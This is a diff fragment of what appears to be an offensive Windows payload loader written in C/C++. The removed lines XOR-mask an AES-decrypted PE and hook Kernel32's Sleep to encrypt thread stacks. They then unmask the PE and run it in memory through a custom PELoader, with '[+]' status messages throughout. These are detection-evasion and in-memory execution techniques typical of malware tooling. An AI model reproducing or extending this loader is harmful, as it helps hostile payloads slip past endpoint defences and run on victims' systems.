@@ -166,39 +166,7 @@ int main(int argc, char** argv) {
         DecryptAES((char*)PE.data, PE.len, (char*)keyData.data, keyData.len);
         printf("[+] PE Decrypted\n\n");
 
-        printf("[+] XOR encoding the PE with 0xaa\n\n");
-        xor_data((unsigned char*)PE.data, PE.len);
         
-        Hookit((char*)"Kernel32.dll", (char*)"Sleep", (PROC)HeapSleep);
-        
-
-
-        //while (true) {
-            
-            
-            printf("[+] Encrypting Stacks for 5 Seconds ...\n\n");
-            HANDLE hEncryptDecryptThread = CreateThread(NULL, 0, EncryptDecryptThread, NULL, 0, NULL);
-            if (hEncryptDecryptThread == NULL) {
-                printf("Failed to create encrypt/decrypt thread. Error: %lu\n", GetLastError());
-                return 1;
-            }
-
-            WaitForSingleObject(hEncryptDecryptThread, INFINITE);
-            CloseHandle(hEncryptDecryptThread);
-            printf("[+] Stack Decrypted back\n\n");
-            
-            
-            printf("[+] XOR decoding the PE with 0xaa\n\n");
-            xor_data((unsigned char*)PE.data, PE.len);
-            
-            
-            printf("[+] Loading and Running PE\n\n");
-            PELoader((char*)PE.data, PE.len);
-            
-            printf("[+] XOR encoding the PE with 0xaa\n\n");
-            xor_data((unsigned char*)PE.data, PE.len);
-
-            printf("[+] Finished ^_^\n\n");
         //}
         
 
